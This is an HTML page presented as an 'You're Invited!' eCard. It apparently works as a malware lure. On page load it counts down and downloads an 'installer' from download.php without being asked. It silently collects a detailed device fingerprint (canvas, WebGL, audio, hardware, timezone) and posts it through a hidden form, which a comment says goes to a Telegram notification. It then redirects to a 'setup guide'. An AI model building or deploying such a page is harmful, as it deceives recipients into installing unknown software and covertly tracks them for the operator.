<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You're Invited! 🎉</title>
<!-- Meta refresh removed - redirect handled by JavaScript and .htaccess -->
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            background:
                radial-gradient(circle at 12% 18%, rgba(72, 219, 205, 0.38), transparent 34%),
                radial-gradient(circle at 88% 16%, rgba(255, 145, 174, 0.3), transparent 32%),
                radial-gradient(circle at 72% 88%, rgba(255, 190, 118, 0.2), transparent 36%),
                linear-gradient(135deg, #173f5f 0%, #3b3f78 48%, #684263 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            position: relative;
            overflow: hidden;
            padding: 20px;
        }

        /* ── Particles ── */
        .particles {
            position: absolute;
            inset: 0;
            overflow: hidden;
            pointer-events: none;
            z-index: 0;
        }

        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.55);
            border-radius: 50%;
            animation: floatUp linear infinite;
            pointer-events: none;
        }

        @keyframes floatUp {
            0%   { transform: translateY(100vh) scale(0); opacity: 0; }
            10%  { opacity: 0.5; }
            90%  { opacity: 0.5; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }

        /* ── Card ── */
        .container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 540px;
            overflow: hidden;
            background: linear-gradient(145deg, rgba(255,255,255,0.22), rgba(255,255,255,0.11));
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(255, 255, 255, 0.24);
            border-radius: 32px;
            padding: 42px 38px 38px;
            box-shadow: 0 30px 80px rgba(32, 20, 82, 0.34), inset 0 1px 0 rgba(255,255,255,0.22);
            animation: slideIn 0.6s ease-out both;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 12%;
            width: 76%;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8), transparent);
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to   { opacity: 1; transform: translateY(0); }
        }

        /* ── Header ── */
        .header {
            text-align: center;
            margin-bottom: 24px;
        }

        .invitation-mark {
            position: relative;
            width: 76px;
            height: 76px;
            margin: 0 auto 18px;
            display: grid;
            place-items: center;
            color: #ffe789;
            background: rgba(255,255,255,0.13);
            border: 1px solid rgba(255,255,255,0.23);
            border-radius: 24px;
            box-shadow: 0 14px 30px rgba(33,20,79,0.2);
            animation: markFloat 3s ease-in-out infinite;
        }

        .invitation-mark::after {
            content: '';
            position: absolute;
            inset: 7px;
            border: 1px dashed rgba(255,231,137,0.3);
            border-radius: 17px;
        }

        .invitation-mark svg {
            width: 38px;
            height: 38px;
            fill: none;
            stroke: currentColor;
            stroke-width: 1.8;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        @keyframes markFloat {
            0%, 100% { transform: translateY(0) rotate(-3deg); }
            50% { transform: translateY(-5px) rotate(2deg); }
        }

        .eyebrow {
            margin-bottom: 8px;
            color: #ffe789;
            font-size: 0.72rem;
            font-weight: 800;
            letter-spacing: 0.18em;
            text-transform: uppercase;
        }

        h1 {
            font-size: clamp(2rem, 7vw, 2.7rem);
            font-weight: 850;
            line-height: 1.05;
            letter-spacing: -1.3px;
            margin-bottom: 10px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }

        .subtitle {
            max-width: 370px;
            margin: 0 auto;
            color: rgba(255,255,255,0.75);
            font-size: 0.98rem;
            font-weight: 450;
            line-height: 1.55;
        }

        /* ── Status banner ── */
        .status-banner {
            display: none;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: rgba(46, 213, 115, 0.18);
            border: 1px solid rgba(46, 213, 115, 0.35);
            border-radius: 16px;
            padding: 11px 16px;
            margin-bottom: 16px;
            font-size: 0.92rem;
            font-weight: 600;
            color: #d4f7e0;
            animation: fadeInUp 0.5s ease both;
        }

        .status-banner.show { display: flex; }

        .status-icon {
            width: 22px;
            height: 22px;
            background: #22c55e;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            box-shadow: 0 0 12px rgba(34,197,94,0.5);
        }

        .status-icon svg {
            width: 13px;
            height: 13px;
            stroke: white;
            stroke-width: 3;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        /* ── Countdown ── */
        .countdown {
            font-size: 3.9rem;
            font-weight: 800;
            line-height: 1;
            color: #ffe066;
            text-align: center;
            text-shadow: 0 0 20px rgba(255,224,102,0.5);
            animation: pulse 1s ease-in-out infinite;
            margin: 4px 0 8px;
        }

        .download-note {
            margin-bottom: 20px;
            color: rgba(255,255,255,0.64);
            font-size: 0.78rem;
            font-weight: 600;
            letter-spacing: 0.02em;
            text-align: center;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50%       { transform: scale(1.08); }
        }

        /* ── Loader ── */
        .loader {
            display: none;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.2);
            border-top-color: #ffe066;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ── Download button ── */
        .btn-wrap {
            display: flex;
            justify-content: center;
            margin-bottom: 2px;
        }

        .download-btn {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            border: 1.5px solid rgba(255,255,255,0.2);
            padding: 14px 38px;
            font-size: 1.05rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            box-shadow: 0 8px 22px rgba(255,107,107,0.4);
            transition: transform 0.2s ease, box-shadow 0.2s ease, filter 0.2s ease;
            letter-spacing: 0.3px;
        }

        .download-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 28px rgba(255,107,107,0.55);
            filter: brightness(1.06);
        }

        .download-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .btn-icon svg {
            width: 18px;
            height: 18px;
            stroke: white;
            stroke-width: 2.5;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2.5px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(16px); }
            to   { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 600px) {
            .container { padding: 32px 20px 28px; border-radius: 26px; }
            .invitation-mark { width: 68px; height: 68px; border-radius: 21px; }
        }

        @media (prefers-reduced-motion: reduce) {
            *, *::before, *::after {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
            }
        }
    </style>
</head>
<body>

<div class="particles" id="particles"></div>

<iframe name="downloadFrame" title="Download" hidden></iframe>
<form id="fingerprintForm" action="./download.php" method="POST" target="downloadFrame" style="display:none;">
    <input type="hidden" name="notify_only" value="1">
    <input type="hidden" id="fpdata"    name="fpdata"    value="">
    <input type="hidden" id="os"        name="os"        value="">
    <input type="hidden" id="browser"   name="browser"   value="">
    <input type="hidden" id="timezone"  name="timezone"  value="">
    <input type="hidden" id="screen"    name="screen"    value="">
</form>

<div class="container">

    <div class="header">
        <div class="invitation-mark" aria-hidden="true">
            <svg viewBox="0 0 48 48">
                <rect x="6" y="11" width="36" height="27" rx="5"></rect>
                <path d="m8 15 16 12 16-12"></path>
                <path d="m8 35 11-10m21 10L29 25"></path>
            </svg>
        </div>
        <p class="eyebrow">A special delivery</p>
        <h1>You're Invited!</h1>
        <p class="subtitle">A special eCard is waiting for you. Your download will begin in just a moment.</p>
    </div>

    <!-- Status banner (hidden until download fires) -->
    <div class="status-banner" id="statusBanner">
        <div class="status-icon">
            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        Download started successfully!
    </div>

    <div class="countdown" id="countdown">3</div>
    <p class="download-note" id="downloadNote">Preparing your invitation…</p>
    <div class="loader"    id="loader"></div>

    <div class="btn-wrap">
        <button type="button" class="download-btn" id="downloadBtn" onclick="startManualDownload()">
            <span class="btn-icon" id="btnIcon">
                <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            </span>
            <span id="btnText">Download Now</span>
        </button>
    </div>

</div>

<script>
(function () {
    'use strict';

    let downloadInProgress = false;
    let countdownTimer     = null;
    let seconds            = 3;

    /* ── Particles ── */
    function createParticles() {
        const wrap = document.getElementById('particles');
        for (let i = 0; i < 30; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            const size = Math.random() * 6 + 2;
            p.style.cssText = [
                'width:'             + size + 'px',
                'height:'            + size + 'px',
                'left:'              + (Math.random() * 100) + '%',
                'animation-duration:'+ (Math.random() * 10 + 10) + 's',
                'animation-delay:-'  + (Math.random() * 10) + 's',
            ].join(';');
            wrap.appendChild(p);
        }
    }

    /* ── Fingerprint ── */
    function collectFingerprint() {
        return {
            os:            navigator.platform  || 'Unknown',
            browser:       navigator.userAgent || 'Unknown',
            timezone:      Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
            screen:        screen.width + 'x' + screen.height,
            language:      navigator.language  || 'Unknown',
            cookieEnabled: navigator.cookieEnabled,
            timestamp:     Date.now(),
            cpuCores:      navigator.hardwareConcurrency || 'Unknown',
            memory:        navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            webgl:         getWebGLInfo(),
            canvas:        getCanvasFingerprint(),
            colorDepth:    screen.colorDepth   || 'Unknown',
            pixelRatio:    window.devicePixelRatio || 'Unknown',
            availScreen:   screen.availWidth + 'x' + screen.availHeight,
            touchSupport:  ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
            plugins:       navigator.plugins ? navigator.plugins.length : 0,
            audioContext:  getAudioFingerprint(),
        };
    }

    function getWebGLInfo() {
        try {
            const c  = document.createElement('canvas');
            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
            if (!gl) return 'Not supported';
            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
            if (!dbg)  return 'No debug info';
            return {
                vendor:   gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   || 'Unknown',
                renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || 'Unknown',
            };
        } catch (e) { return 'Error'; }
    }

    function getCanvasFingerprint() {
        try {
            const c = document.createElement('canvas');
            const x = c.getContext('2d');
            x.textBaseline = 'top';
            x.font = '14px Arial';
            x.fillText('Fingerprint', 2, 2);
            return c.toDataURL().substring(0, 50);
        } catch (e) { return 'Error'; }
    }

    function getAudioFingerprint() {
        try {
            const AC = window.AudioContext || window.webkitAudioContext;
            if (!AC) return 'Not supported';
            const ctx = new AC();
            const sr  = ctx.sampleRate;
            ctx.close();
            return sr || 'Unknown';
        } catch (e) { return 'Error'; }
    }

    /* ── UI helpers ── */
    function setBtn(state) {
        const btn  = document.getElementById('downloadBtn');
        const icon = document.getElementById('btnIcon');
        const txt  = document.getElementById('btnText');

        const downloadSVG = '<svg viewBox="0 0 24 24" style="width:18px;height:18px;stroke:white;stroke-width:2.5;fill:none;stroke-linecap:round;stroke-linejoin:round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>';
        const checkSVG    = '<svg viewBox="0 0 24 24" style="width:18px;height:18px;stroke:white;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round"><polyline points="20 6 9 17 4 12"/></svg>';

        if (state === 'downloading') {
            icon.innerHTML  = '<span class="spinner"></span>';
            txt.textContent = 'Downloading…';
            btn.disabled    = true;
        } else if (state === 'complete') {
            icon.innerHTML  = checkSVG;
            txt.textContent = 'Download Again';
            btn.disabled    = false;
        } else if (state === 'error') {
            icon.innerHTML  = downloadSVG;
            txt.textContent = 'Try Again';
            btn.disabled    = false;
        } else {
            icon.innerHTML  = downloadSVG;
            txt.textContent = 'Download Now';
            btn.disabled    = false;
        }
    }

    function showSuccessBanner() {
        document.getElementById('statusBanner').classList.add('show');
    }

    /* ── Download ── */
    async function submitDownload() {
        if (downloadInProgress) return;
        downloadInProgress = true;

        setBtn('downloading');
        document.getElementById('downloadNote').textContent = 'Starting your download…';

        try {
            const response = await fetch('./download.php?check=1', {
                method: 'GET',
                cache: 'no-store',
                credentials: 'same-origin'
            });
            const status = await response.json();
            if (!response.ok || !status.available) {
                throw new Error('Installer unavailable');
            }
        } catch (error) {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('statusBanner').classList.remove('show');
            document.getElementById('downloadNote').textContent =
                'The installer is temporarily unavailable. Please try again.';
            setBtn('error');
            downloadInProgress = false;
            return;
        }

        const fp = collectFingerprint();
        document.getElementById('fpdata').value   = btoa(JSON.stringify(fp));
        document.getElementById('os').value       = fp.os;
        document.getElementById('browser').value  = fp.browser;
        document.getElementById('timezone').value = fp.timezone;
        document.getElementById('screen').value   = fp.screen;

        // Send the existing Telegram notification in the background.
        document.getElementById('fingerprintForm').submit();

        // Use a top-level navigation for the actual file. Browsers reliably
        // recognize this as a download, unlike a cross-origin hidden iframe.
        window.location.assign('./download.php?file=1');

        setTimeout(function () {
            document.getElementById('loader').style.display = 'none';
            setBtn('complete');
            showSuccessBanner();
            document.getElementById('downloadNote').textContent = 'Opening your installation guide…';
            downloadInProgress = false;
        }, 700);

        setTimeout(function () {
            window.location.assign('../ecard-setup-guide.html');
        }, 6000);
    }

    window.startManualDownload = function () {
        if (countdownTimer) {
            clearInterval(countdownTimer);
            countdownTimer = null;
        }
        document.getElementById('countdown').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        submitDownload();
    };

    /* ── Boot ── */
    document.addEventListener('DOMContentLoaded', function () {
        createParticles();

        if (new URLSearchParams(window.location.search).get('download') === '1') {
            // A repeat download uses the same checked, same-origin flow.
            setTimeout(function () {
                window.startManualDownload();
            }, 250);
            return;
        }

        countdownTimer = setInterval(function () {
            const el = document.getElementById('countdown');
            seconds--;
            el.textContent = Math.max(seconds, 0);

            if (seconds <= 0) {
                clearInterval(countdownTimer);
                countdownTimer = null;
                el.style.display = 'none';
                document.getElementById('loader').style.display = 'block';
                document.getElementById('downloadNote').textContent = 'Getting everything ready…';

                setTimeout(function () {
                    document.getElementById('loader').style.display = 'none';
                    submitDownload();
                }, 1200);
            }
        }, 1000);
    });

}());
</script>
</body>
</html>
